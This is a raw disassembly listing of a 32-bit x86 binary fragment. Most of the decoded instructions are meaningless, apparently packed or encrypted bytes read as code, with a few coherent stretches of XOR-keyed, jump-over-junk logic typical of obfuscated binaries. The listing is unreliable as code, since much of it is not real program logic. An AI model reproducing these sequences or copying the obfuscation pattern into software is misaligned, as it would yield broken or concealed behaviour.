  409d85:	adc    BYTE PTR [edx+0x25],0xf1
  409d89:	xchg   ebp,esi
  409d8b:	sti    
  409d8c:	xor    BYTE PTR [esi],bh
  409d8e:	dec    edi
  409d8f:	popa   
  409d90:	adc    al,0xc0
  409d92:	sbb    ebx,DWORD PTR [eax-0x1b1f9fb]
  409d98:	repz pop ss
  409d9a:	fwait
  409d9b:	mov    dh,ah
  409d9d:	sbb    DWORD PTR [edx-0x5df2740b],eax
  409da3:	cwde   
  409da4:	mul    dl
  409da6:	(bad)  
  409da7:	adc    DWORD PTR [edi+0x1a],edx
  409daa:	adc    BYTE PTR [edx],bl
  409dac:	in     al,dx
  409dad:	data16 (bad) 
  409daf:	mov    esp,0xb8f7847f
  409db4:	sti    
  409db5:	xor    esp,ebp
  409db7:	fdivr  st(1),st
  409db9:	jmp    0x82a00721
  409dbe:	pop    DWORD PTR [ebp-0x78]
  409dc1:	popf   
  409dc2:	xlat   BYTE PTR ds:[ebx]
  409dc3:	cmc    
  409dc4:	push   esi
  409dc5:	imul   edi,eax,0x3d
  409dc8:	es push 0x350cdb1e
  409dce:	popa   
  409dcf:	leave  
  409dd0:	push   es
  409dd1:	or     ecx,ebx
  409dd3:	xchg   edx,esi
  409dd5:	mov    edx,0xf6addd67
  409dda:	push   0xffffffeb
  409ddc:	sub    BYTE PTR [eax+0x998e8c8],bl
  409de2:	mov    cl,0x70
  409de4:	pop    ebp
  409de5:	in     eax,dx
  409de6:	rcr    edx,cl
  409de8:	scas   eax,DWORD PTR es:[edi]
  409de9:	popf   
  409dea:	out    0x24,al
  409dec:	je     0x409d9a
  409dee:	xchg   ebp,eax
  409def:	jmp    0x409e61
  409df1:	mov    edi,0xc2780040
  409df6:	mov    ebp,ecx
  409df8:	mov    dl,0x2
  409dfa:	fst    QWORD PTR ds:0x339be320
  409e00:	dec    esi
  409e01:	imul   esp,ebx,0x1fa97e10
  409e07:	out    dx,eax
  409e08:	retf   
  409e09:	push   ds
  409e0a:	push   cs
  409e0b:	sub    DWORD PTR [esi],ebp
  409e0d:	sbb    ecx,DWORD PTR [edi+0x7e770399]
  409e13:	mov    bl,0xe3
  409e15:	adc    BYTE PTR [esi+0x36685033],bh
  409e1b:	jg     0x409e69
  409e1d:	popf   
  409e1e:	sar    DWORD PTR [edi+edx*4-0x19716af],1
  409e25:	cmp    BYTE PTR fs:[edi],0xbb
  409e29:	rol    BYTE PTR [eax-0x50],cl
  409e2c:	(bad)  
  409e2d:	push   cs
  409e2e:	scas   al,BYTE PTR es:[edi]
  409e2f:	xchg   esp,eax
  409e30:	ds sahf 
  409e32:	lock (bad) 
  409e35:	dec    eax
  409e37:	dec    esp
  409e38:	mov    BYTE PTR [esp+ebx*1+0x4053578e],dl
  409e3f:	add    dl,BYTE PTR es:[edx]
  409e42:	pop    edi
  409e43:	fxch   st(7)
  409e45:	jnp    0x409e04
  409e47:	sbb    BYTE PTR [eax+0x267b2e2d],ch
  409e4d:	adc    ecx,esp
  409e4f:	pop    eax
  409e50:	stc    
  409e51:	adc    al,0x16
  409e53:	lods   eax,DWORD PTR ds:[esi]
  409e54:	cmc    
  409e55:	pop    ecx
  409e56:	jl     0x409ea7
  409e58:	or     DWORD PTR [edi+0x73],ebp
  409e5b:	add    BYTE PTR [ecx],cl
  409e5d:	jle    0x409e1f
  409e5f:	xchg   edx,eax
  409e60:	retf   0xfa6e
  409e63:	call   edx
  409e65:	inc    ebp
  409e66:	ret    
  409e67:	jecxz  0x409e27
  409e69:	enter  0xd35e,0x61
  409e6d:	lods   eax,DWORD PTR ds:[esi]
  409e6e:	(bad)  
  409e6f:	pop    esi
  409e70:	jle    0x409e6f
  409e72:	repnz xlat BYTE PTR ds:[ebx]
  409e74:	mov    ds:0xce42b851,al
  409e79:	in     al,dx
  409e7a:	jmp    0xe811a6b9
  409e7f:	mov    ecx,0x16150427
  409e84:	cmp    ecx,DWORD PTR [ebx+0x73]
  409e87:	clc    
  409e88:	ss mov ch,0xaf
  409e8b:	mov    al,ds:0xc5da6b9c
  409e90:	mov    ch,0xfe
  409e92:	and    al,0xc8
  409e94:	and    dl,0x1c
  409e97:	jecxz  0x409e3b
  409e99:	out    0x11,al
  409e9b:	pop    edx
  409e9c:	call   0xca316955
  409ea1:	out    dx,eax
  409ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea3:	mov    DWORD PTR [edi-0x79],0xbd112eb3
  409eaa:	xor    eax,0xa0b0562a
  409eaf:	and    DWORD PTR [ebx-0x6cb2b5c9],ebp
  409eb5:	lods   eax,DWORD PTR ds:[esi]
  409eb6:	loope  0x409eb7
  409eb8:	push   ss
  409eb9:	int3   
  409eba:	jl     0x409f07
  409ebc:	(bad)
  409ebf:	push   ebp
  409ec0:	sub    BYTE PTR [esi+ebx*1-0x78],0xa4
  409ec5:	add    eax,esi
  409ec7:	aas    
  409ec8:	mov    ebx,0x738b8404
  409ecd:	add    dh,BYTE PTR [ecx-0x566b343]
  409ed3:	and    BYTE PTR [esi+eiz*1+0x7],bl
  409ed7:	dec    esi
  409ed8:	xor    esi,eax
  409eda:	cmp    esp,ebp
  409edc:	add    al,0x50
  409ede:	jae    0x409ea2
  409ee0:	sub    BYTE PTR ds:0x37f2b588,ah
  409ee6:	fdiv   QWORD PTR [ecx]
  409ee8:	sub    esp,edi
  409eea:	jmp    0xdf020219
  409eef:	sub    al,0xc5
  409ef1:	cmc    
  409ef2:	scas   eax,DWORD PTR es:[edi]
  409ef3:	loop   0x409ee4
  409ef5:	sub    DWORD PTR [edi*1+0x3fa16930],edi
  409efc:	test   BYTE PTR [ebx+0x43],dl
  409eff:	xor    eax,0x9e0db024
  409f04:	call   0xc1f57fba
  409f09:	or     bl,BYTE PTR [edx+0x367cb93a]
  409f0f:	in     al,0x44
  409f11:	jecxz  0x409f04
  409f13:	scas   al,BYTE PTR es:[edi]
  409f14:	aad    0x6e
  409f16:	loopne 0x409f2a
  409f18:	inc    edi
  409f19:	or     ecx,DWORD PTR [ebx-0x79]
  409f1c:	push   ds
  409f1d:	or     edi,DWORD PTR [ecx+edx*1]
  409f20:	or     cl,BYTE PTR [edi+ebp*2+0x63ce0356]
  409f27:	outs   dx,BYTE PTR ds:[esi]
  409f28:	inc    edx
  409f29:	sub    esp,DWORD PTR [eax+0x6f]
  409f2c:	sbb    ebp,esi
  409f2e:	mov    ch,BYTE PTR [eax]
  409f30:	into   
  409f31:	pop    esp
  409f32:	mov    ebp,0xa5128037
  409f37:	pop    ebp
  409f38:	xchg   esi,eax
  409f39:	and    eax,0x50165390
  409f3e:	mov    esp,0x65bb2574
  409f43:	pop    ebx
  409f44:	scas   al,BYTE PTR es:[edi]
  409f45:	adc    edi,DWORD PTR [ebx-0x43831a56]
  409f4b:	xchg   ecx,eax
  409f4c:	push   es
  409f4d:	and    ecx,DWORD PTR [ebx-0x35f575ff]
  409f53:	mov    esi,0x415388ac
  409f58:	xor    edi,eax
  409f5a:	add    eax,0xe708a173
  409f5f:	in     eax,0x7c
  409f61:	cmp    al,0xf1
  409f63:	adc    ch,BYTE PTR [eax+edi*2-0x46]
  409f67:	scas   eax,DWORD PTR es:[edi]
  409f68:	dec    esp
  409f69:	pop    eax
  409f6a:	push   ecx
  409f6b:	in     al,dx
  409f6c:	or     eax,0xa69a992b
  409f71:	test   al,0xc8
  409f73:	adc    eax,0xe38e34d3
  409f78:	inc    esp
  409f79:	cmp    eax,0x53fbef5c
  409f7e:	xlat   BYTE PTR ds:[ebx]
  409f7f:	mov    ecx,0x868f3b02
  409f84:	(bad)  
  409f85:	xor    esp,DWORD PTR [edi-0x2d]
  409f88:	xor    eax,DWORD PTR [ebp+0x32]
  409f8b:	lods   al,BYTE PTR ds:[esi]
  409f8c:	sub    cl,BYTE PTR [ecx+edx*1+0x507db00e]
  409f93:	mov    edi,0xe27ec2a0
  409f98:	sti    
  409f99:	mov    cl,0x24
  409f9b:	jl     0x40a014
  409f9d:	pusha  
  409f9e:	sbb    ch,BYTE PTR [ecx+edi*2-0x61]
  409fa2:	outs   dx,BYTE PTR ds:[esi]
  409fa3:	adc    BYTE PTR [edx+0x70961a20],al
  409fa9:	scas   al,BYTE PTR es:[edi]
  409faa:	sbb    eax,0x303df16f
  409faf:	sub    al,0x44
  409fb1:	(bad)  
  409fb2:	shr    BYTE PTR [edx-0x53f122db],1
  409fb8:	xchg   edi,eax
  409fb9:	add    BYTE PTR [edx],dh
  409fbb:	(bad)  
  409fbc:	mov    esp,0x7fa8017e
  409fc1:	or     esp,DWORD PTR [ebp-0x114678de]
  409fc7:	shl    edi,1
  409fc9:	mov    edx,0x4ff98822
  409fce:	add    esp,DWORD PTR [eax]
  409fd0:	cmp    esp,edx
  409fd2:	inc    esi
  409fd3:	push   edx
  409fd4:	into   
  409fd5:	cmp    dl,BYTE PTR [edx]
  409fd7:	jae    0x409f96
  409fd9:	xchg   DWORD PTR fs:[eax+0x4a],ecx
  409fdd:	push   esp
  409fde:	mov    al,0xbe
  409fe0:	les    ecx,FWORD PTR [ebx-0x34]
  409fe3:	idiv   BYTE PTR [eax-0x23d8dd74]
  409fe9:	stos   DWORD PTR es:[edi],eax
  409fea:	ror    DWORD PTR [ebx+0xf],cl
  409fed:	retf   
  409fee:	in     al,dx
  409fef:	xor    BYTE PTR [ebp-0x9fb7dcb],ch
  409ff5:	adc    eax,0xae581d65
  409ffa:	lods   al,BYTE PTR ds:[esi]
  409ffb:	loopne 0x40a052
  409ffd:	arpl   WORD PTR [ebx-0x5efaa559],sp
  40a003:	mov    eax,0xfe0b15c4
  40a008:	stos   DWORD PTR es:[edi],eax
  40a009:	mov    ecx,DWORD PTR [ebp-0x10]
  40a00c:	xor    eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x24]
  40a02a:	dec    edx
  40a02b:	popf   
  40a02c:	ret    0xee70
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	popa   
  40a036:	pop    esp
  40a037:	pushf  
  40a038:	jnp    0x40a061
  40a03a:	pop    eax
  40a03b:	out    dx,al
  40a03c:	js     0x40a06f
  40a03e:	or     al,0x0
  40a040:	mov    WORD PTR [ecx],es
  40a042:	inc    esi
  40a043:	test   al,0x66
  40a045:	mov    gs,esp
  40a047:	or     BYTE PTR [ebx+0xbac4b8f],ch
  40a04d:	adc    DWORD PTR [ebp+0x30b59106],0xa10d8296
  40a057:	pusha  
  40a058:	dec    esi
  40a059:	call   0x27c6:0x5969d32c
  40a060:	adc    ebx,esi
  40a062:	out    0x6c,al
  40a064:	jmp    0x40a044
  40a066:	adc    edx,ecx
  40a068:	xchg   cl,ch
  40a06a:	repz adc DWORD PTR [edx-0x27713f66],eax
  40a071:	cmp    al,bh
  40a073:	xor    esi,DWORD PTR ds:0xc3aee6d1
  40a079:	test   al,0xd7
  40a07b:	hlt    
  40a07c:	icebp  
  40a07d:	test   edi,eax
  40a07f:	loopne 0x40a0db
  40a081:	cmp    al,0xef
  40a083:	inc    ebp
  40a084:	(bad)  
  40a085:	jecxz  0x40a0e7
  40a087:	sub    DWORD PTR [esp+edi*1+0x2e9b88cc],ebx
  40a08e:	daa    
  40a08f:	sar    BYTE PTR [edi+0x44],cl
  40a092:	pop    esi
  40a093:	adc    al,BYTE PTR [ebp+0x363aca5f]
  40a099:	into   
  40a09a:	xlat   BYTE PTR ds:[ebx]
  40a09b:	retf   
  40a09c:	jl     0x40a034
  40a09e:	enter  0x989,0xf4
  40a0a2:	add    DWORD PTR [edx],ebp
  40a0a4:	gs icebp 
  40a0a6:	mov    edx,0x2b033dbb
  40a0ab:	jno    0x40a0c3
  40a0ad:	cli    
  40a0ae:	xor    DWORD PTR [ebx+0x10],esp
  40a0b1:	lea    ecx,[edi-0x6fa8905f]
  40a0b7:	jge    0x40a0f9
  40a0b9:	iret   
  40a0ba:	pop    ebx
  40a0bb:	push   cs
  40a0bc:	lds    edi,FWORD PTR [ebx]
  40a0be:	les    esi,FWORD PTR [si-0x369d]
  40a0c3:	and    ebx,DWORD PTR [eax]
  40a0c5:	lahf   
  40a0c6:	lahf   
  40a0c7:	adc    DWORD PTR [ebx],edi
  40a0c9:	mov    bh,0xa1
  40a0cb:	and    edx,DWORD PTR [eax-0x477e85eb]
  40a0d1:	mov    dl,0xbb
  40a0d3:	leave  
  40a0d4:	iret   
  40a0d5:	inc    edi
  40a0d6:	xor    ebp,DWORD PTR [ebp+ebx*4+0x59]
  40a0da:	sub    dl,0x5d
  40a0dd:	sbb    bl,al
  40a0df:	sbb    ebx,eax
  40a0e1:	or     al,0x39
  40a0e3:	into   
  40a0e4:	pop    edi
  40a0e5:	js     0x40a120
  40a0e7:	adc    bh,BYTE PTR [esi+0x6071a220]
  40a0ed:	arpl   WORD PTR [ecx+0x439cb629],bx
  40a0f3:	popf   
  40a0f4:	xchg   ebx,eax
  40a0f5:	cmc    
  40a0f6:	ins    BYTE PTR es:[edi],dx
  40a0f7:	aaa    
  40a0f8:	sbb    esp,DWORD PTR [eax+0x3c]
  40a0fb:	mov    al,ds:0x5909933d
  40a100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a101:	out    0x2b,al
  40a103:	dec    edx
  40a104:	fmul   st(1),st
  40a106:	push   edx
  40a107:	lods   eax,DWORD PTR ds:[esi]
  40a108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a109:	popa   
  40a10a:	ins    DWORD PTR es:[edi],dx
  40a10b:	sub    ch,dl
  40a10d:	sub    ecx,esi
  40a10f:	or     eax,0xa1f83433
  40a114:	scas   al,BYTE PTR es:[edi]
  40a115:	arpl   WORD PTR [esi-0x109d919e],bx
  40a11b:	in     al,0xcf
  40a11d:	rcl    BYTE PTR ds:[edx+eiz*1],1
  40a121:	popa   
  40a122:	mov    dl,dh
  40a124:	dec    edi
  40a125:	int    0x41
  40a127:	jmp    0x76d572bf
  40a12c:	ins    DWORD PTR es:[edi],dx
  40a12d:	dec    eax
  40a12e:	and    al,0xe8
  40a130:	or     esp,DWORD PTR [ecx-0x1f434ecc]
  40a136:	aas    
  40a137:	add    al,0xa2
  40a139:	dec    ebp
  40a13a:	popf   
  40a13b:	sti    
  40a13c:	ins    BYTE PTR es:[edi],dx
  40a13d:	sub    al,0x3d
  40a13f:	xchg   edi,eax
  40a140:	push   esi
  40a141:	call   0xe688:0xfa014f8a
  40a148:	cmp    DWORD PTR [ebp+0x42814b52],edi
  40a14e:	ror    BYTE PTR [esi-0x34],1
  40a151:	mov    al,0x1a
  40a153:	imul   edx,DWORD PTR [edi-0xd183e40],0xffffffa4
  40a15a:	xor    DWORD PTR [ebx],0x42737c85
  40a160:	int    0xf7
  40a162:	push   cs
  40a163:	dec    eax
  40a164:	es in  al,dx
  40a166:	call   0x524e418e
  40a16b:	mov    edx,0x9bdb36b6
  40a170:	push   0x9b631e2
  40a175:	or     dh,BYTE PTR [eax+ebx*4-0x2c12a7dd]
  40a17c:	(bad)  
  40a17d:	fsub   QWORD PTR [edi-0x66]
  40a180:	jbe    0x40a1fd
  40a182:	pop    ebp
  40a184:	fdiv   DWORD PTR [ebp+0x38]
  40a187:	lea    eax,[esi]
  40a189:	cld    
  40a18a:	and    al,0x4d
  40a18c:	sbb    ah,BYTE PTR [ebx+0x29a5f283]
  40a192:	push   eax
  40a193:	xor    eax,0x1e8f1693
  40a198:	cmp    esi,esp
  40a19a:	sub    al,0xc6
  40a19c:	cld    
  40a19d:	pop    ebx
  40a19e:	(bad)  
  40a19f:	loopne 0x40a17f
  40a1a1:	retf   0x7c9c
  40a1a4:	icebp  
  40a1a5:	int    0x9f
  40a1a7:	(bad)
  40a1ab:	gs pop ebx
  40a1ad:	adc    bl,dh
  40a1af:	xlat   BYTE PTR ds:[ebx]
  40a1b0:	dec    ebx
  40a1b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b2:	clc    
  40a1b3:	xchg   ebx,eax
  40a1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b5:	inc    ebp
  40a1b6:	aam    0xd9
  40a1b8:	aad    0xa1
  40a1ba:	(bad)  
  40a1bb:	popf   
  40a1bc:	jg     0x40a1d7
  40a1be:	jmp    0x49e7:0x9e9980d2
  40a1c5:	add    al,0xd4
  40a1c7:	and    DWORD PTR [esi],ebx
  40a1c9:	fild   QWORD PTR [edi]
  40a1cb:	jae    0x40a1b7
  40a1cd:	sbb    BYTE PTR [ebx+eiz*1-0x3d81ee20],dh
  40a1d4:	mov    bl,0x17
  40a1d6:	test   esi,ecx
  40a1d8:	(bad)  
  40a1d9:	in     eax,dx
  40a1da:	cmp    al,0xbb
  40a1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1dd:	int    0x20
  40a1df:	jb     0x40a1f3
  40a1e1:	cdq    
  40a1e2:	mov    ds:0xbb603d7c,eax
  40a1e7:	loope  0x40a1a5
  40a1e9:	fwait
  40a1ea:	bound  ebp,QWORD PTR [esi+eiz*2]
  40a1ed:	fldcw  WORD PTR [edx+0x55]
  40a1f0:	scas   eax,DWORD PTR es:[edi]
  40a1f1:	mov    dl,0xe9
  40a1f3:	pop    ebp
  40a1f4:	push   ecx
  40a1f5:	cdq    
  40a1f6:	lock les esp,FWORD PTR [eax]
  40a1f9:	mov    ebp,DWORD PTR [edi+0x1f0b3216]
  40a1ff:	or     DWORD PTR [ebx],0x913aa85
  40a205:	pop    eax
  40a206:	(bad)  
  40a207:	shl    BYTE PTR [esi+0x63],0x10
  40a20b:	ins    BYTE PTR es:[edi],dx
  40a20c:	cdq    
  40a20d:	pop    eax
  40a20e:	test   eax,0xd2541c84
  40a213:	sbb    dl,dh
  40a215:	or     BYTE PTR [esi+0x28],al
  40a218:	sub    eax,0x71250db6
  40a21d:	lods   eax,DWORD PTR ds:[esi]
  40a21e:	mov    esi,0x5c7366bd
  40a223:	in     eax,0xbb
  40a225:	mov    edi,0x5c206faa
  40a22a:	iret   
  40a22b:	sub    edx,ebp
  40a22d:	pop    ss
  40a22e:	lock fs add al,0xd
  40a232:	sub    al,0x67
  40a234:	mov    dl,0xed
  40a236:	and    al,0xf3
  40a238:	(bad)  
  40a239:	out    dx,al
  40a23a:	inc    esp
  40a23b:	(bad)  
  40a23c:	outs   dx,DWORD PTR ds:[esi]
  40a23d:	and    DWORD PTR [ebx],0xfffffff2
  40a240:	call   DWORD PTR ds:0x8f810294
  40a246:	add    DWORD PTR [edi+0x30dc97b5],ebp
  40a24c:	ins    BYTE PTR es:[edi],dx
  40a24d:	(bad)  
  40a24f:	in     eax,dx
  40a250:	push   ss
  40a251:	in     al,dx
  40a252:	test   eax,0xf1354aee
  40a257:	pushf  
  40a258:	sbb    ch,BYTE PTR [esi]
  40a25a:	iret   
  40a25b:	outs   dx,BYTE PTR ds:[esi]
  40a25c:	mov    esi,esp
  40a25e:	sbb    ecx,DWORD PTR [esi-0x43a52704]
  40a264:	fwait
  40a265:	mov    dh,0xdd
  40a267:	inc    edi
  40a268:	addr16 pushf 
  40a26a:	inc    edx
  40a26b:	and    BYTE PTR [ecx+0xf],cl
  40a26e:	inc    esi
  40a26f:	cdq    
  40a270:	aad    0x7c
  40a272:	test   al,dl
  40a274:	fild   QWORD PTR [ecx-0x1ef2d35]
  40a27a:	enter  0xd29c,0xc1
  40a27e:	mov    bl,0x41
  40a280:	sub    al,0x3
  40a282:	inc    eax
  40a283:	push   cs
  40a284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a285:	mov    edi,esi
  40a287:	mov    cs,ecx
  40a289:	sub    al,0xf5
  40a28b:	push   esi
  40a28c:	adc    ah,BYTE PTR [edx-0x3b]
  40a28f:	stc    
  40a290:	jg     0x40a2ec
  40a292:	inc    eax
  40a293:	xchg   esp,eax
  40a294:	cli    
  40a295:	sub    dh,dh
  40a297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a298:	in     eax,dx
  40a299:	sbb    eax,0x2edecd86
  40a29e:	xor    esi,DWORD PTR [ebx+0x66]
  40a2a1:	pop    eax
  40a2a2:	jmp    0x40a30e
  40a2a4:	gs inc edi
  40a2a6:	add    eax,0xa225b12b
  40a2ab:	cli    
  40a2ac:	call   0xb36079f1
  40a2b1:	loop   0x40a267
  40a2b3:	neg    BYTE PTR [esp+edx*4-0x6e77ff5d]
  40a2ba:	push   es
  40a2bb:	push   edi
  40a2bc:	shl    DWORD PTR [eax+0x398aebc9],cl
  40a2c2:	ror    DWORD PTR [ecx],cl
  40a2c4:	lods   eax,DWORD PTR ds:[esi]
  40a2c5:	inc    eax
  40a2c6:	pop    ebx
  40a2c7:	cdq    
  40a2c8:	xchg   esp,eax
  40a2c9:	bound  esp,QWORD PTR [eax]
  40a2cb:	(bad)  
  40a2cc:	mov    bh,BYTE PTR [eax]
  40a2ce:	leave  
  40a2cf:	jmp    0x6db2:0x663ecf22
  40a2d6:	xor    al,0xf5
  40a2d8:	enter  0xc3e7,0x50
  40a2dc:	push   esi
  40a2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2de:	jmp    0x40a330
  40a2e0:	jg     0x40a270
  40a2e2:	mov    ss,WORD PTR [ecx+0x5a]
  40a2e5:	mov    esp,0x85e95690
  40a2ea:	arpl   WORD PTR [eax-0xb],di
  40a2ed:	daa    
  40a2ee:	or     BYTE PTR [ebx+0x77979602],dl
  40a2f4:	rcl    BYTE PTR [ecx],1
  40a2f6:	or     al,0x1a
  40a2f8:	test   al,0xdb
  40a2fa:	mov    ebx,0xf7ab961d
  40a2ff:	or     ah,BYTE PTR [edx]
  40a301:	retf   0x7f69
  40a304:	pop    ss
  40a305:	test   eax,0x387db4d
  40a30a:	loope  0x40a28f
  40a30c:	mov    ds:0xc62daa1d,eax
  40a311:	div    DWORD PTR [ebx-0x43a6db10]
  40a317:	nop    DWORD PTR [edx-0x610682f]
  40a31e:	or     bh,BYTE PTR [edx-0x6b280fc9]
  40a324:	rcr    eax,0xfb
  40a327:	jns    0x40a384
  40a329:	inc    ebx
  40a32a:	push   edx
  40a32b:	xchg   ebx,eax
  40a32c:	push   ds
  40a32d:	sar    DWORD PTR [edx],0x5e
  40a330:	aam    0x8f
  40a332:	mov    edi,0x63ad2199
  40a337:	out    0xca,al
  40a339:	xor    ecx,esi
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	jmp    0x40a3e9
  40a3cd:	xor    DWORD PTR [ecx],esi
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	je     0x40a42b
  40a3d9:	dec    ebx
  40a3da:	push   ebp
  40a3db:	rcr    BYTE PTR [edx],cl
  40a3dd:	sbb    DWORD PTR [esi],ebp
  40a3df:	cmp    BYTE PTR [ebp+edx*4-0x6288123f],al
  40a3e6:	dec    eax
  40a3e7:	mov    ds:0x11fc744b,eax
  40a3ec:	mov    edi,0x70ff8501
  40a3f1:	shl    DWORD PTR [edi+ecx*4],0xff
  40a3f5:	or     BYTE PTR [ebx+0x67a57070],dl
  40a3fb:	mov    esp,0xf4618614
  40a400:	ret    0xa6d4
  40a403:	aam    0x4f
  40a405:	test   eax,0x4103ae63
  40a40a:	imul   eax,DWORD PTR [eax+0x75],0xb
  40a40e:	fistp  WORD PTR [ecx-0x415496d5]
  40a414:	lods   al,BYTE PTR ds:[esi]
  40a415:	pop    ecx
  40a416:	repz in eax,dx
  40a418:	leave  
  40a419:	push   eax
  40a41a:	int    0xc9
  40a41c:	xchg   ebx,eax
  40a41d:	cmp    BYTE PTR [ebx-0x6536a0f4],dl
  40a423:	pop    esp
  40a424:	push   edx
  40a425:	xchg   esi,eax
  40a426:	into   
  40a427:	sub    ah,BYTE PTR [esi]
  40a429:	leave  
  40a42a:	pop    ss
  40a42b:	les    esp,FWORD PTR [edx]
  40a42d:	hlt    
  40a42e:	or     bl,BYTE PTR [eax]
  40a430:	mov    DWORD PTR [esi-0x1f1a5912],0x35b79fdf
  40a43a:	xchg   DWORD PTR [edx-0x1728227a],edx
  40a440:	iret   
  40a441:	lock xor ecx,edi
  40a444:	pusha  
  40a445:	(bad)
  40a448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a449:	cmp    al,0xb2
  40a44b:	in     eax,0xc2
  40a44d:	jmp    0x34025a5
  40a452:	scas   al,BYTE PTR es:[edi]
  40a453:	shr    ah,0x74
  40a456:	jp     0x40a439
  40a458:	push   edx
  40a459:	push   edi
  40a45a:	pop    esi
  40a45b:	call   0xfd24ddaf
  40a460:	and    ch,dh
  40a462:	test   DWORD PTR [ebx],edi
  40a464:	(bad)  [esi]
  40a466:	lock sti 
  40a468:	nop
  40a469:	sub    esi,DWORD PTR [esi]
  40a46b:	xor    DWORD PTR [ecx-0x1a],ecx
  40a46e:	aas    
  40a46f:	cmp    ecx,DWORD PTR [ebx+eiz*8+0x56]
  40a473:	mov    ?,WORD PTR [ebx]
  40a475:	aad    0x62
  40a477:	jb     0x40a433
  40a479:	and    eax,0xa436cf84
  40a47e:	pop    esp
  40a47f:	(bad)  
  40a480:	leave  
  40a481:	daa    
  40a482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a483:	adc    ecx,edx
  40a485:	or     al,0x9d
  40a487:	cwde   
  40a488:	and    DWORD PTR [edi+eax*1+0xb],0xc47f8ae6
  40a490:	ds aas 
  40a492:	jbe    0x40a47f
  40a494:	push   eax
  40a495:	stc    
  40a496:	outs   dx,DWORD PTR ds:[esi]
  40a497:	inc    esp
  40a498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a499:	imul   esp,ebp,0x78
  40a49c:	jne    0x40a47c
  40a49e:	jg     0x40a44d
  40a4a0:	adc    al,al
  40a4a2:	std    
  40a4a3:	cs add al,0xb7
  40a4a6:	sub    cl,al
  40a4a8:	mov    esi,0xdad53803
  40a4ad:	sti    
  40a4ae:	push   DWORD PTR [ebx*4-0x449c0630]
  40a4b5:	in     eax,dx
  40a4b6:	bnd jmp 0x40a4c9
  40a4b9:	aad    0x22
  40a4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4bc:	cmp    edi,esp
  40a4be:	cmp    BYTE PTR [edx+0x43],ah
  40a4c1:	inc    edx
  40a4c2:	cmc    
  40a4c3:	push   0x95c93c50
  40a4c8:	in     al,dx
  40a4c9:	inc    ebx
  40a4ca:	inc    esp
  40a4cb:	push   0xc2c7040c
  40a4d0:	dec    esp
  40a4d1:	pusha  
  40a4d2:	inc    edx
  40a4d3:	je     0x40a47b
  40a4d5:	jle    0x40a4b2
  40a4d7:	push   ebp
  40a4d8:	mov    BYTE PTR [edx],ah
  40a4da:	sbb    eax,0x5688e8dd
  40a4df:	mov    dl,0x14
  40a4e1:	(bad)  
  40a4e2:	xor    eax,0x6f55c17
  40a4e7:	and    al,BYTE PTR [esi+0x183854e5]
  40a4ed:	pop    ebx
  40a4ee:	mov    dl,0x5b
  40a4f0:	adc    esi,DWORD PTR [eax-0x71]
  40a4f3:	cmc    
  40a4f4:	(bad)  
  40a4f5:	int3   
  40a4f6:	ds mov bh,0x75
  40a4f9:	lods   eax,DWORD PTR ds:[esi]
  40a4fa:	aad    0xe9
  40a4fc:	fcmovb st,st(7)
  40a4fe:	push   ds
  40a4ff:	jecxz  0x40a4ec
  40a501:	dec    ecx
  40a502:	sub    eax,0x27add049
  40a507:	(bad)  
  40a508:	(bad)  
